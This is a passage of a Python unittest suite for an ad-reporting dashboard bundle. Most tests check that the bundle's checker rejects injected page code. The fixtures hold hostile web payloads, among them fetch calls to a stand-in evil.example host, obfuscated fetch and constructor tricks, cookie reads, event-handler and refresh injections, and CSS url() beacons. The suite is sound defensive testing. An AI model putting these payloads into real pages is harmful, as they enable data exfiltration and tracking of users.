        key = str(verdicts["ads"][0].get("ad_id") or verdicts["ads"][0].get("id"))
        row = next(r for r in rows_of(out, "verdicts") if r["ad_id"] == key)
        self.assertEqual(row["confidence_note"], "n/a (no confidence given for this verdict)")

    def test_each_sparkline_is_marked_with_its_own_metric(self):
        page = (SCRIPT.parent / "assets" / "claude-dashboard" / "index.html").read_text()
        tiles = re.findall(r'<div class="cr-kpi" data-metric="(\w+)">.*?<div class="cr-spark" data-source="daily"( data-where="metric=(\w+)")?></div>', page)
        self.assertEqual(len(tiles), 12)
        for metric, _, marked in tiles:
            self.assertEqual(marked, metric)

    def test_no_style_rule_hides_a_message_the_page_wrote(self):
        css = (SCRIPT.parent / "assets" / "claude-dashboard" / "dashboard.css").read_text()
        self.assertNotRegex(css, r"color:\s*transparent")
        rule = next(line for line in css.splitlines() if "data-dash-source-state=empty" in line)
        for kept in (".cr-empty", ".cr-failed", '-how'):
            self.assertIn(kept, rule)

    def test_a_mix_only_run_carries_the_reason_for_the_numbers_and_ads_it_does_not_have(self):
        out = build_mix_only(self.tmp, self.tmp / "mix-only")
        sections = {r["panel"]: r for r in rows_of(out, "sections")}
        self.assertEqual((rows_of(out, "kpis"), rows_of(out, "verdicts")), ([], []))
        for panel in ("kpis", "board", "all-ads"):
            self.assertEqual(sections[panel]["state"], "empty")
            self.assertTrue(sections[panel]["why"] and sections[panel]["how"])
        self.assertEqual(rows_of(out, "verdict-board"), [])
        page = (out / "files" / "index.html").read_text()
        for holder in ("kpis", "all-ads"):
            self.assertIn('id="%s-empty" data-source="sections" data-field="why" data-where="panel=%s"' % (holder, holder), page)
            self.assertIn('id="%s-how" data-source="sections" data-field="how" data-where="panel=%s"' % (holder, holder), page)
        self.assertEqual(dashboard.check_bundle(str(out)), [])

    def test_the_page_never_reads_an_empty_table_as_nothing_found(self):
        script = (SCRIPT.parent / "assets" / "claude-dashboard" / "dashboard.js").read_text()
        self.assertIn("n/a (no rows in this data)", script)
        self.assertIn("emptyState('kpis', 'kpis')", script)
        self.assertIn("emptyState('all-ads', 'all-ads')", script)

    def test_every_way_a_source_can_fail_has_its_own_short_message(self):
        script = (SCRIPT.parent / "assets" / "claude-dashboard" / "dashboard.js").read_text()
        for status in ("error", "connect", "declined", "missing"):
            self.assertRegex(script, r"\b%s: '[^']+'," % status)
        self.assertNotRegex(script, r"status === 'error'")

    # ---------- last review round ----------

    def write_js(self, bundle, extra):
        target = bundle / "files" / "dashboard.js"
        target.write_text(target.read_text() + "\n" + extra + "\n")

    def test_a_blank_confidence_is_null_with_its_reason_and_the_bundle_passes_its_own_check(self):
        verdicts = json.loads(json.dumps(self.inputs["verdicts"]))
        verdicts["ads"][0]["confidence"] = ""
        _, ctx = report.build_report(rows=cm.load_rows(str(FIXTURE)), verdicts=verdicts, generated="2026-01-02")
        out = self.tmp / "blank-confidence"
        dashboard.write_bundle(ctx, str(out))
        key = str(verdicts["ads"][0].get("ad_id") or verdicts["ads"][0].get("id"))
        row = next(r for r in rows_of(out, "verdicts") if r["ad_id"] == key)
        for column in ("confidence",):
            self.assertIsNone(row[column], column)
            self.assertTrue(row[column + "_note"], column)
        self.assertEqual(dashboard.check_bundle(str(out)), [])

    def test_check_flags_a_store_that_is_not_a_list_and_text_that_is_not_utf8(self):
        b = self.copy()
        manifest = json.loads((b / "manifest.json").read_text())
        manifest["store"] = 5
        (b / "manifest.json").write_text(json.dumps(manifest))
        self.assertFlags(b, "manifest store is not a list")
        b = self.copy()
        (b / "files" / "dashboard.css").write_bytes(b"\xff\xfe.cr { color: red; }")
        self.assertFlags(b, "page file dashboard.css cannot be read as UTF-8 text")
        self.assertFlags(b, "store document files/dashboard.css does not match")
        done = subprocess.run([sys.executable, "-I", str(SCRIPT / "report.py"), "--check-dashboard", str(b)], capture_output=True, text=True)
        self.assertEqual(done.returncode, 1)
        self.assertNotIn("Traceback", done.stderr)

    @unittest.skipIf(hasattr(os, "geteuid") and os.geteuid() == 0, "root can write into a read-only folder")
    def test_a_folder_that_cannot_have_a_scratch_beside_it_is_written_in_place_with_a_warning(self):
        parent = self.tmp / "locked"
        target = parent / "bundle"
        target.mkdir(parents=True)
        (target / "files").mkdir()
        (target / "files" / "old.js").write_text("stale")
        os.chmod(parent, 0o500)
        try:
            with mock.patch("sys.stderr") as err:
                dashboard.write_bundle(self.ctx, str(target))
        finally:
            os.chmod(parent, 0o700)
        self.assertIn("writing it into the folder in place", "".join(c.args[0] for c in err.write.call_args_list))
        self.assertFalse((target / "files" / "old.js").exists())
        self.assertEqual(dashboard.check_bundle(str(target)), [])

    def test_a_move_across_filesystems_falls_back_to_writing_in_place_and_leaves_no_scratch(self):
        target = self.tmp / "exdev"
        real = Path.rename

        def across(self, other):
            if "/new/" in str(self).replace(os.sep, "/") + "/":
                raise OSError(errno.EXDEV, "Invalid cross-device link")
            return real(self, other)

        with mock.patch.object(Path, "rename", across), mock.patch("sys.stderr"):
            dashboard.write_bundle(self.ctx, str(target))
        self.assertEqual(dashboard.check_bundle(str(target)), [])
        self.assertEqual([p.name for p in self.tmp.iterdir() if p.name.startswith(".exdev-")], [])

    def test_a_swap_that_fails_midway_puts_the_old_bundle_back(self):
        target = self.tmp / "midway"
        dashboard.write_bundle(self.ctx, str(target))
        before = {str(p.relative_to(target)): p.read_bytes() for p in target.rglob("*") if p.is_file()}
        _, other = report.build_report(rows=cm.load_rows(str(FIXTURE)), generated="2026-01-03")
        real = Path.rename
        calls = []

        def flaky(self, other_path):
            calls.append(str(self))
            if str(self).endswith("/new/files"):
                raise OSError(errno.EIO, "disk error")
            return real(self, other_path)

        with mock.patch.object(Path, "rename", flaky):
            with self.assertRaises(OSError):
                dashboard.write_bundle(other, str(target))
        after = {str(p.relative_to(target)): p.read_bytes() for p in target.rglob("*") if p.is_file()}
        self.assertEqual(before, after)
        self.assertEqual([p.name for p in self.tmp.iterdir() if p.name.startswith(".midway-")], [])

    def test_check_flags_each_further_way_script_can_reach_outside_the_page(self):
        jar_word = "coo" + "kie"
        for code in ("const f = Function('return 1');", "const v = document['%s'];" % jar_word, "img.src = 'x';", "location.href = '/x';",
                     "window.location.assign('/x');", "location.replace('/x');", "location = '/x';", "setTimeout('go()', 5);",
                     "setInterval(\"go()\", 5);"):
            b = self.copy()
            self.write_js(b, code)
            self.assertFlags(b, "dashboard.js uses ")

    def test_check_flags_number_literals_in_arrays_and_objects_of_any_size(self):
        for code in ("const a = [12, 40,];", "const b = [3, 4];", "const c = { a: 1, b: 2 };", "const d = {'x': 1.5, \"y\": 2,};"):
            b = self.copy()
            self.write_js(b, code)
            self.assertFlags(b, "dashboard.js has an array or object of number literals")

    def test_script_rules_also_read_the_source_with_its_comments(self):
        b = self.copy()
        self.write_js(b, "const s = 'a'; // ok\nconst t = 'http://x'; fetch('/y')")
        self.assertFlags(b, "dashboard.js uses fetch")
        b = self.copy()
        self.write_js(b, "/* eval(1) */")
        self.assertFlags(b, "dashboard.js uses eval")

    def test_check_flags_a_url_in_any_attribute_in_any_quoting(self):
        for old_tag, new_tag in (
                ('<div class="cr" id="top">', "<div class=\"cr\" id=\"top\"><img src='https://example.com/a.png' alt=''>"),
                ('<div class="cr" id="top">', '<div class="cr" id="top"><img src=https://example.com/a.png alt="">'),
                ('<div class="cr" id="top">', '<div class="cr" id="top"><img srcset="data:image/gif;base64,AAAA 1x, https://example.com/b.png 2x" alt="">'),
                ('<div class="cr" id="top">', '<div class="cr" id="top"><video poster="https://example.com/p.png"></video>'),
                ('<div class="cr" id="top">', '<div class="cr" id="top"><svg><use xlink:href="https://example.com/s.svg#a"></use></svg>'),
                ('<div class="cr" id="top">', '<div class="cr" id="top"><a href=\'https://example.com/x\'>x</a>'),
                ('<div class="cr" id="top">', '<div class="cr" id="top"><object data="https://example.com/o.swf"></object>'),
                ('<div class="cr" id="top">', '<div class="cr" id="top"><div action="https://example.com/post"></div>')):
            b = self.copy()
            self.edit(b, "files/index.html", old_tag, new_tag)
            self.assertFlags(b, "that is not a bundle file or a data: URL: https://example.com/")
        b = self.copy()
        self.edit(b, "files/index.html", '<div class="cr" id="top">', '<div class="cr" id="top"><img srcset="data:image/gif;base64,AAAA 1x" alt="">')
        self.assertFalse([p for p in self.problems(b) if "not a bundle file" in p])

    def test_check_flags_a_number_in_a_visible_attribute_or_a_css_content_string(self):
        for attr in ("title", "alt", "value", "placeholder", "aria-label"):
            b = self.copy()
            self.edit(b, "files/index.html", '<div class="cr" id="top">', '<div class="cr" id="top"><span %s="Up 4242 percent">x</span>' % attr)
            self.assertFlags(b, "has the number 4242 in its %s attribute" % attr)
        b = self.copy()
        target = b / "files" / "dashboard.css"
        target.write_text(target.read_text() + '\n.cr-x::after { content: "top 17"; }\n')
        self.assertFlags(b, "has the number 17 in a content string")

    def test_check_flags_an_outside_address_in_an_inline_style_attribute(self):
        b = self.copy()
        self.edit(b, "files/index.html", '<div class="cr" id="top">', '<div class="cr" id="top" style="background:url(https://x.example/p.gif)">')
        self.assertFlags(b, "index.html style attribute loads https://x.example/p.gif from a url()")
        b = self.copy()
        self.edit(b, "files/index.html", '<div class="cr" id="top">', '<div class="cr" id="top" style="color: var(--text)">')
        self.assertFalse([p for p in self.problems(b) if "style attribute" in p])

    def page_problems(self, name, payload):
        b = self.copy()
        if name == "index.html":
            self.edit(b, "files/index.html", '<div class="cr" id="top">', '<div class="cr" id="top">' + payload)
        else:
            target = b / "files" / name
            target.write_text(target.read_text() + "\n" + payload + "\n")
        return [p for p in self.problems(b) if p.startswith(name + " ")]

    def test_check_reads_a_quoted_greater_than_as_part_of_the_value_not_the_end_of_the_tag(self):
        for payload in ('<div class="cr" title="x>" style="background:url(https://evil.example/x)"></div>',
                        '<img class="cr" alt="a>" src="https://evil.example/p.gif">',
                        '<img class="cr" alt="a>" src="data:image/png,x" onerror="alert(1)">',
                        '<script title="a>" src="https://evil.example/x.js"></script>',
                        "<span class='cr' title='b>' data-x=\"<\" onmouseover='go()'>x</span>"):
            self.assertTrue(self.page_problems("index.html", payload), "%r passed the check" % payload)

    def test_check_refuses_frames_a_refresh_and_a_data_url_anywhere_but_an_image(self):
        for payload in ('<iframe class="cr" srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>',
                        '<div class="cr" srcdoc="x"></div>',
                        '<meta http-equiv="refresh" content="0;url=https://evil.example/">',
                        '<a class="cr" href="data:text/html,<script>alert(1)</script>">x</a>',
                        '<embed class="cr" src="dashboard.js">', '<base href="#">',
                        '<img class="cr" src="data:text/html,x" alt="">', '<video class="cr" poster="data:image/png,x"></video>',
                        '<img class="cr" src=" DATA:text/html,x" alt="">', '<a class="cr" href="#" ping="https://evil.example/">x</a>'):
            self.assertTrue(self.page_problems("index.html", payload), "%r passed the check" % payload)
        for payload in ('<img class="cr" src="data:image/png;base64,AAAA" alt="">', '<img class="cr" src="data:image/svg+xml;base64,AAAA" alt="">',
                        '<a class="cr" href="#ads">x</a>'):
            self.assertEqual(self.page_problems("index.html", payload), [], payload)

    def test_check_refuses_a_custom_property_that_carries_an_address_into_a_loading_function(self):
        for payload in ('.cr{--a:"evil.png";background:image-set(var(--a) 1x)}', '.cr-x{--a:"https:x"}', '.cr-x{background:image-set(var(--b) 1x)}'):
            self.assertTrue(self.page_problems("dashboard.css", payload), "%r passed the check" % payload)
        for payload in ('.cr-x{--f:"DM Sans", sans-serif}', '.cr-x{--p:"data:image/png;base64,AAAA"}'):
            self.assertEqual(self.page_problems("dashboard.css", payload), [], payload)

    def test_check_refuses_markup_comments_or_script_tags_inside_a_script(self):
        for payload in ('<script><!--<script>\n/*</script>*/\nfetch("https://evil.example/x")\n</script>', "<script>/*<SCRIPT>*/</script>"):
            self.assertTrue(self.page_problems("index.html", payload), "%r passed the check" % payload)

    def test_check_refuses_a_manifest_file_name_that_is_not_a_bare_local_name(self):
        for entry in ("https://evil.example/x.js", "../x.js", "/x.js", "sub/x.js", "x"):
            b = self.copy()
            manifest = json.loads((b / "manifest.json").read_text())
            manifest["files"].append(entry)
            (b / "manifest.json").write_text(json.dumps(manifest))
            target = b / "files" / entry.lstrip("/")
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_text("")
            self.edit(b, "files/index.html", '<script src="dashboard.js"></script>', '<script src="dashboard.js"></script><script src="%s"></script>' % entry)
            self.assertFlags(b, "manifest files entry %r is not a bare file name" % entry)
            self.assertFlags(b, "loads a script that is not a bundle file")

    def add_page_file(self, name, text, tag):
        b = self.copy()
        manifest = json.loads((b / "manifest.json").read_text())
        manifest["files"].append(name)
        (b / "manifest.json").write_text(json.dumps(manifest))
        (b / "files" / name).write_text(text)
        self.edit(b, "files/index.html", '<script src="dashboard.js"></script>', '<script src="dashboard.js"></script>' + tag)
        return self.problems(b)

    def test_check_refuses_module_scripts_and_any_import_or_export(self):
        for payload in ('<script type="module">import"https://evil.example/x.js"</script>', '<script>import{}from"https://evil.example/x.js"</script>',
                        '<script>import*as a from"https://evil.example/x.js"</script>', '<script>export * from "https://evil.example/x.js"</script>',
                        '<script>export{}from"https://evil.example/x.js"</script>', '<script type="text/plain" src="dashboard.js"></script>',
                        '<script type=" MODULE " src="dashboard.js"></script>'):
            self.assertTrue(self.page_problems("index.html", payload), "%r passed the check" % payload)
        found = self.add_page_file("x.js", 'export*from"https://evil.example/x.js"', '<script type="module" src="x.js"></script>')
        self.assertTrue(any("x.js uses export" in p for p in found), found)
        self.assertTrue(any("has a script of type 'module'" in p for p in found), found)
        self.assertEqual(self.page_problems("index.html", '<script type="text/javascript" src="dashboard.js"></script>'), [])

    def test_check_allows_only_lowercase_html_css_and_js_page_files_each_loaded_by_its_own_tag(self):
        for name, text, tag in (("x.txt", 'fetch("https://evil.example/x")', '<script src="x.txt"></script>'),
                                ("x.JS", 'fetch("https://evil.example/x")', '<script src="x.JS"></script>'),
                                ("x.Js", 'fetch("https://evil.example/x")', '<script src="x.Js"></script>'),
                                ("x.mjs", 'fetch("https://evil.example/x")', '<script src="x.mjs"></script>'),
                                ("x.CSS", '@import url("https://evil.example/x.css");', '<link rel="stylesheet" href="x.CSS">')):
            found = self.add_page_file(name, text, tag)
            self.assertTrue(any("manifest files entry %r is not a bare file name" % name in p for p in found), found)
            self.assertTrue(any("that is not a bundle file" in p for p in found), found)
        self.assertTrue(any("may load only a .js file" in p for p in self.page_problems("index.html", '<script src="fonts.css"></script>')))
        self.assertTrue(any("may load only a .css file" in p for p in self.page_problems("index.html", '<link rel="stylesheet" href="dashboard.js">')))

    SPELLED_ROUND = ('fetch("https://evil.example/x")', r'\u{66}etch("https://evil.example/x")', 'self["fe"+"tch"]("https://evil.example/x")',
                     'window[atob("ZmV0Y2g=")]("https://evil.example/x")', '(function(){}).constructor("return 1")()',
                     'Reflect.set(location,"href","https://evil.example/")', 'new Image().srcset="https://evil.example/p.gif"',
                     'document.createElement("img").setAttribute("src","https://evil.example/p.gif")',
                     'Object.assign(new Image(),{src:"https://evil.example/p.gif"})', 'document.body.style.backgroundImage="url(https://evil.example/p.gif)"',
                     'document.write("<img src=https://evil.example/p.gif>")', 'window.open("https://evil.example/")',
                     'new Worker("x.js")', 'new SharedWorker("x.js")', 'navigator.serviceWorker.register("x.js")', 'importScripts("https://evil.example/x.js")')

    def test_check_refuses_any_page_code_that_is_not_the_packages_own(self):
        for payload in self.SPELLED_ROUND:
            b = self.copy()
            target = b / "files" / "dashboard.js"
            target.write_text(target.read_text() + "\n" + payload + "\n")
            self.assertFlags(b, "page file dashboard.js differs from the package's shipped, reviewed dashboard.js")
        for name in ("index.html", "fonts.css", "dashboard.css", "dashboard.js"):
            b = self.copy()
            target = b / "files" / name
            text = target.read_text()
            target.write_text(text[:-1] + ("x" if text[-1] != "x" else "y"))
            self.assertFlags(b, "page file %s differs from the package's shipped, reviewed %s" % (name, name))
        b = self.copy()
        target = b / "files" / "index.html"
        text = target.read_text()
        logo = re.search(r'src="(data:image/svg\+xml;base64,[^"]*)"', text).group(1)
        target.write_text(text.replace(logo, "https://evil.example/logo.svg", 1))
        self.assertFlags(b, "page file index.html differs")
        target.write_text(text.replace(logo, "data:image/png;base64,AAAA", 1))
        self.assertFalse([p for p in self.problems(b) if "differs" in p])

    def edit_store(self, change):
        b = self.copy()
        manifest = json.loads((b / "manifest.json").read_text())
        change(b, manifest)
        (b / "manifest.json").write_text(json.dumps(manifest))
        return self.problems(b)

    def test_check_refuses_a_store_document_or_file_the_package_does_not_write(self):
        evil = json.dumps({"text": '<script>fetch("https://evil.example/x")</script>'})

        def extra_page(b, m):
            (b / "files" / "evil.html").write_text('<script>fetch("https://evil.example/x")</script>')
            (b / "store" / "files-evil.html.json").write_text(evil)
            m["store"].append({"doc": "files/evil.html", "file": "store/files-evil.html.json"})

        def other_case(b, m):
            (b / "store" / "Files-index.html.json").write_text(evil)
            m["store"].append({"doc": "Files/index.html", "file": "store/Files-index.html.json"})

        def dataset_doc(b, m):
            (b / "store" / "datasets-ads.json").write_text(json.dumps({"source": {"kind": "file", "url": "https://evil.example/ads.json"}}))
            m["store"].append({"doc": "datasets/ads", "file": "store/datasets-ads.json"})

        outside = Path(tempfile.mkdtemp(dir=self._tmp.name)) / "meta.json"
        outside.write_text(json.dumps({"title": "x"}))

        def absolute_file(b, m):
            entry = next(e for e in m["store"] if e["doc"] == "dash/meta")
            entry["file"] = str(outside)

        for change, words in ((extra_page, "store document 'files/evil.html' is not one this package writes"),
                              (other_case, "store document 'Files/index.html' is not one this package writes"),
                              (dataset_doc, "store document 'datasets/ads' is not one this package writes"),
                              (absolute_file, "store document dash/meta names the file %r" % str(outside))):
            found = self.edit_store(change)
            self.assertTrue(any(words in p for p in found), found)
        found = self.edit_store(extra_page)
        self.assertTrue(any("files/evil.html is in the bundle but not in its manifest" in p for p in found), found)
        self.assertTrue(any("store/files-evil.html.json is in the bundle but not in its manifest" in p for p in found), found)
        found = self.edit_store(lambda b, m: m["store"].pop())
        self.assertTrue(any("manifest store lacks files/dashboard.js" in p for p in found), found)

    def test_check_refuses_a_page_file_whose_line_endings_were_rewritten(self):
        for name in ("dashboard.js", "index.html"):
            b = self.copy()
            target = b / "files" / name
            text = target.read_bytes().decode("utf-8").replace("\n", "\r\n")
            target.write_bytes(text.encode("utf-8"))
            (b / "store" / ("files-%s.json" % name)).write_text(json.dumps({"text": text}))
            self.assertFlags(b, "page file %s differs from the package's shipped, reviewed %s" % (name, name))

    def test_check_refuses_a_page_file_the_package_does_not_ship(self):
        for name, text, tag in (("w.js", 'new Worker("x.js")', '<script src="w.js"></script>'),
                                ("x.js", 'importScripts("https://evil.example/x.js")', '<script src="x.js"></script>'),
                                ("x.html", "<p>x</p>", "")):
            found = self.add_page_file(name, text, tag)
            self.assertTrue(any("manifest files list %s, which is not one of the package's page files" % name in p for p in found), found)
        b = self.copy()
        manifest = json.loads((b / "manifest.json").read_text())
        manifest["files"].append("dashboard.js")
        (b / "manifest.json").write_text(json.dumps(manifest))
        self.assertFlags(b, "manifest files list dashboard.js more than once")

    def test_script_rules_refuse_escapes_workers_writes_windows_and_constructors(self):
        for payload in (r'\u{66}etch(1)', r'"\x66"', 'new Worker(u)', 'new SharedWorker(u)', 'navigator.serviceWorker', 'importScripts(u)',
                        'img.srcset = u', 'document.write(u)', 'window.open(u)', 'open(u)', 'f.constructor(u)'):
            self.assertTrue(dashboard._script_problems("x.js", payload), payload)
        self.assertEqual(dashboard._script_problems("x.js", "el.setAttribute('aria-pressed', 'true'); say('Click to open this ad');"), [])

    def test_check_keeps_each_markup_guard(self):
        for payload in ('<noscript><img src="https://evil.example/p.gif" alt=""></noscript>',
                        '<a class="cr" href="https://evil.example/" href="#">x</a>',
                        '<link rel="preload" as="image" imagesrcset="https://evil.example/a.png 1x">',
                        '<button class="cr" formaction="https://evil.example/">x</button>',
                        '<img class="cr" src="data:image/png;base64,AAAA" attributionsrc alt="">',
                        '<!-- x --!><img src="https://evil.example/p.gif" alt="">', '<!--><img src="https://evil.example/p.gif" alt="">',
                        '<img class="cr" alt="" srcset="data:image/gif;base64,AAAA&#32;1x&#44;&#32;https://evil.example/b.png&#32;2x">'):
            self.assertTrue(self.page_problems("index.html", payload), "%r passed the check" % payload)
        for payload in ('<!-- a > <img src="https://evil.example/p.gif"> -->',
                        '<textarea class="cr" aria-label="Note"><img src="https://evil.example/p.gif"></textarea>'):
            self.assertEqual(self.page_problems("index.html", payload), [], payload)

    def test_check_keeps_each_style_guard(self):
        for payload in ('.cr-x{--a:"evil.png"}', '.cr-x{background:image-set(attr(data-u) 1x)}', '.cr{--z:x(} ) ; --a:"evil.png"; }',
                        '.cr-x{color:red', '@font-face{font-family:x;src:local(x)}', '@page{margin:0}'):
            self.assertTrue(self.page_problems("dashboard.css", payload), "%r passed the check" % payload)

    def test_check_refuses_a_selector_that_steps_from_the_root_to_the_host_page(self):
        for payload in (".cr ~ body{margin:0}", ".cr + div{margin:0}", ".cr~.x{margin:0}", ".cr:not(.y) ~ *{margin:0}",
                        ".cr html{margin:0}", ".cr :root{margin:0}", ".cr-a, .cr ~ p{margin:0}"):
            self.assertTrue(self.page_problems("dashboard.css", payload), "%r passed the check" % payload)
        for payload in (".cr .cr-a ~ .cr-b{margin:0}", ".cr > .cr-a + .cr-b{margin:0}", ".cr-body{margin:0}", ".cr-a:is(.x, .y) .cr-b{margin:0}"):
            self.assertEqual(self.page_problems("dashboard.css", payload), [], payload)

    def test_the_header_says_which_formats_the_scorecard_left_out_and_how_many_concepts_the_grid_shows(self):
        facts = {r["fact"]: r["value"] for r in rows_of(self.bundle, "header")}
        self.assertEqual(facts["Formats not scored"], dashboard.unscored_formats(self.ctx))
        self.assertTrue(facts["Formats not scored"] == "Every ad's format is in the scorecard." or " are not in the scorecard: " in facts["Formats not scored"])
        grid = panels.heatmap_grid(self.ctx)
        shown, total = len(grid["shown"]), len(grid["families"])
        self.assertLess(shown, total)
        self.assertEqual(facts["Concepts shown"], "Showing the top %d of %d concepts by spend (an arbitrary display cap); %d hidden." % (shown, total, total - shown))

    def test_each_gap_carries_its_reason_alone_its_cell_and_whether_the_grid_shows_its_concept(self):
        gaps = rows_of(self.bundle, "gaps")
        self.assertTrue(gaps)
        shown = {r["concept"] for r in rows_of(self.bundle, "white-space")}
        for gap in gaps:
            self.assertTrue(gap["why"].startswith(gap["because"]), gap)
            self.assertNotIn(", and %s in %s " % (gap["concept"], gap["format"]), gap["because"])
            self.assertLess(len(gap["because"]), len(gap["why"]))
            self.assertEqual(gap["in_grid"], gap["concept"] in shown, gap)
            self.assertIsInstance(gap["cell_ads"], int)


TEMPLATE = SCRIPT.parent / "assets" / "report-template.html"
TOKEN = re.compile(r"(--[\w-]+)\s*:\s*([^;]+);")


def css_block(text, opener):
    """The custom properties of the first rule that opens with `opener`, as {name: value}."""
    start = text.index(opener) + len(opener)
    return dict(TOKEN.findall(text[start:text.index("}", start)]))


def pick(value, dark):
    """A value as the browser reads it in one colour scheme: each light-dark(a, b) becomes a or b."""
    out, at = "", 0
    while True:
        found = value.find("light-dark(", at)
        if found < 0:
            return out + value[at:]
        depth, i, comma = 1, found + len("light-dark("), None
        while depth:
            if value[i] == "(":
                depth += 1
            elif value[i] == ")":
                depth -= 1
            elif value[i] == "," and depth == 1:
                comma = i
            i += 1
        light, darker = value[found + len("light-dark("):comma].strip(), value[comma + 1:i - 1].strip()
        out += value[at:found] + (darker if dark else light)
        at = i


class BrandTest(unittest.TestCase):
    """The dashboard wears the HTML report's brand: the same tokens, fonts and logos, so the two cannot drift apart."""

    FONTS = ("--font-body", "--font-head", "--font-mono")

    @classmethod
    def setUpClass(cls):
        cls.template = TEMPLATE.read_text(encoding="utf-8")
        cls.css = (dashboard.PAGE / "dashboard.css").read_text(encoding="utf-8")
        cls.light = css_block(cls.template, ":root {")
        cls.darks = (css_block(cls.template, ':root:not([data-theme="light"]) {'), css_block(cls.template, ':root[data-theme="dark"] {'))
        cls.brand = css_block(cls.css, ".cr {")

    def test_every_report_token_has_the_reports_light_and_dark_value(self):
        self.assertGreater(len(self.light), 60)
        self.assertEqual(self.darks[0], self.darks[1], "the report's two dark blocks agree")
        for name, value in self.light.items():
            if name in self.FONTS:
                continue
            self.assertIn(name, self.brand, name)
            self.assertEqual(pick(self.brand[name], dark=False), value, name)
            self.assertEqual(pick(self.brand[name], dark=True), self.darks[0].get(name, value), name)

    def test_the_fonts_are_the_reports_and_fall_back_to_the_hosts_sans(self):
        for name in self.FONTS:
            self.assertEqual(self.brand[name].split(",")[0], self.light[name].split(",")[0], name)
        self.assertIn("var(--font-anthropic-sans)", self.brand["--font-body"])

    def test_a_drifted_token_fails_the_parity_check(self):
        drifted = dict(self.brand, **{"--accent": "light-dark(hsl(251 97% 60%), hsl(251 91% 50%))"})
        self.assertNotEqual(pick(drifted["--accent"], dark=True), self.darks[0]["--accent"])

    def test_fonts_ship_as_data_urls_inside_the_bundle_under_the_store_limit(self):
        fonts = (dashboard.PAGE / "fonts.css").read_text(encoding="utf-8")
        faces = re.findall(r'font-family: "([^"]+)"; font-style: normal; font-weight: (\d+)', fonts)
        self.assertEqual(faces, [("DM Sans", "400"), ("DM Sans", "500"), ("DM Sans", "600"), ("DM Sans", "700"), ("Roboto Mono", "400"), ("Roboto Mono", "500")])
        urls = re.findall(r"url\(([^)]*)\)", fonts)
        self.assertEqual(len(urls), len(faces))
        self.assertTrue(all(u.startswith("data:font/woff2;base64,") for u in urls))
        self.assertLess(len(json.dumps({"text": fonts}).encode("utf-8")), dashboard.DOC_MAX)
        for licence in ("OFL-DM-Sans.txt", "LICENSE-Roboto-Mono.txt"):
            self.assertTrue((dashboard.PAGE / licence).is_file(), licence)

    def test_the_page_loads_the_fonts_and_carries_the_reports_logos_as_data_urls(self):
        page = dashboard.page_text("index.html")
        self.assertTrue(page.startswith('<link rel="stylesheet" href="fonts.css">'))
        self.assertNotIn("{{logo", page)
        sources = re.findall(r'<img class="cr-logo[^"]*" src="([^"]+)"', page)
        self.assertEqual(sources, [dashboard.logo_url(name) for name in ("jumbo-logo.svg", "jumbo-logo-dark.svg", "er-logo-dark.svg", "er-logo.svg")])
        self.assertTrue(all(src.startswith("data:image/svg+xml;base64,") for src in sources))

    def test_verdicts_use_the_reports_verdict_tokens_never_the_hosts_status_colours(self):
        for cls, token in (("pause", "kill"), ("iterate", "iterate"), ("check", "check"), ("scale", "scale"), ("keep", "keep"), ("too-early", "early")):
            self.assertRegex(self.css, r"\.cr-v-%s \{ background: var\(--v-%s-bg\); color: var\(--v-%s-fg\)" % (cls, token, token))
        self.assertNotRegex(self.css, r"--color-(ok|warn|bad)")


    def test_every_named_format_has_its_own_hue_and_grey_is_kept_for_a_format_not_known(self):
        assets = SCRIPT.parent / "assets" / "claude-dashboard"
        script = (assets / "dashboard.js").read_text()
        palette = re.search(r"const FORMAT_SERIES = \[([^\]]*)\]", script).group(1)
        names = re.findall(r"var\((--[a-z0-9-]+)\)", palette)
        self.assertGreaterEqual(len(names), 6)
        css = (assets / "dashboard.css").read_text()
        for side in (0, 1):
            hues = []
            for name in names:
                value = re.search(re.escape(name) + r": light-dark\(hsl\((\d+) [^)]*\), hsl\((\d+) [^)]*\)\);", css)
                self.assertIsNotNone(value, name)
                hues.append(int(value.group(side + 1)))
            gaps = [min(abs(a - b), 360 - abs(a - b)) for i, a in enumerate(hues) for b in hues[i + 1:]]
            self.assertGreaterEqual(min(gaps), 10, (side, hues))
        self.assertNotIn("series-neutral", palette)
        self.assertNotIn("series-other", palette)


class NewDatasetTest(unittest.TestCase):
    """The ad-level datasets: a value that cannot be read is null with its reason, never 0."""

    @classmethod
    def setUpClass(cls):
        cls.rows = cm.load_rows(str(FIXTURE))
        cls.verdicts = run_json("keep-or-kill", "verdicts.py")

    def build(self, rows):
        _, ctx = report.build_report(rows=rows, verdicts=self.verdicts, currency="USD", generated="2026-01-02")
        return dashboard.build_datasets(ctx)[0]

    def test_unvalued_ad_days_over_the_method_setting_stop_the_running_value_from_the_first_with_their_share(self):
        rows = [dict(r) for r in self.rows]
        days = sorted({r["date"] for r in rows})
        gaps = days[4:8]
        for r in rows:
            if r["date"] in gaps:
                r["conversion_value"] = None
        whole = sum(r["spend"] for r in rows)
        share = sum(r["spend"] for r in rows if r["date"] in gaps and (r.get("conversions") or 0) > 0) / whole * 100
        self.assertGreater(share, dashboard.VALUE_GAP_MAX_PCT)
        cumulative = self.build(rows)["cumulative"]
        at = next(i for i, r in enumerate(cumulative) if r["day"] == gaps[0])
        self.assertIsNotNone(cumulative[at - 1]["cum_value"])
        reason = "n/a (ad-days with purchases but no recorded value hold %.1f%% of spend, over the 5%% this report allows; the first is on %s)" % (share, gaps[0])
        for r in cumulative[at:]:
            self.assertIsNone(r["cum_value"])
            self.assertIsNone(r["cum_roas"])
            self.assertEqual(r["cum_value_note"], reason)
            self.assertEqual(r["cum_roas_note"], reason)
        self.assertEqual(dashboard.validate_rows("cumulative", cumulative, dashboard.load_schema()), [])

    def test_a_daily_blank_says_what_the_day_was_missing_not_that_it_had_no_data(self):
        rows = [{"date": "2026-03-01", "ad_id": "1", "spend": 100.0, "impressions": 1000.0, "conversions": 2.0, "conversion_value": 300.0},
                {"date": "2026-03-02", "ad_id": "1", "spend": 100.0, "impressions": 1000.0, "conversions": 0.0, "conversion_value": 0.0},
                {"date": "2026-03-04", "ad_id": "1", "spend": 100.0, "impressions": 1000.0, "conversions": 1.0, "conversion_value": 90.0}]
        daily = {(r["day"], r["metric"]): r for r in dashboard.daily_rows(type("Ctx", (), {"rows": rows, "currency": "USD"})())}
        self.assertIsNone(daily[("2026-03-02", "cpa")]["value"])
        self.assertEqual(daily[("2026-03-02", "cpa")]["value_note"], "n/a (zero purchases)")
